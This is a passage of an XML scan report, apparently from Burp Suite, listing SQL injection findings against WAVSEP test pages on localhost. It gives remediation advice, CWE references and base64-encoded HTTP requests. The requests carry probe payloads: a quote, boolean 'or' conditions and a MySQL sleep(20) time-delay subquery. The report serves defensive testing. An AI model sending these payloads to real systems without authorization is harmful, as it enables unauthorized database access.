    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the minBalanace parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>14024438 or 2089=02089</b> and <b>28123307 or 1315=1322</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTI3DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjIwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwMTQwMjQ0MzglMjBvciUyMDIwODklM2QwMjA4OQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwMjgxMjMzMDclMjBvciUyMDEzMTUlM2QxMzIy]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjQxIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>763155596314846208</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case09-InjectionInUpdate-Numeric-CommandInjection-With200Errors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgid parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20007</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dpZD0xJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTIzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOSAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGFuIHVwZGF0ZSBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpFeGNlcHRpb24gZGV0YWlsczogamF2YS5zcWwuU1FMU3ludGF4RXJyb3JFeGNlcHRpb246IFlvdSBoYXZlIGFuIGVycm9yIGluIHlvdXIgU1FMIHN5bnRheDsgY2hlY2sgdGhlIG1hbnVhbCB0aGF0IGNvcnJlc3BvbmRzIHRvIHlvdXIgTXlTUUwgc2VydmVyIHZlcnNpb24gZm9yIHRoZSByaWdodCBzeW50YXggdG8gdXNlIG5lYXIgJycnIGF0IGxpbmUgMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZW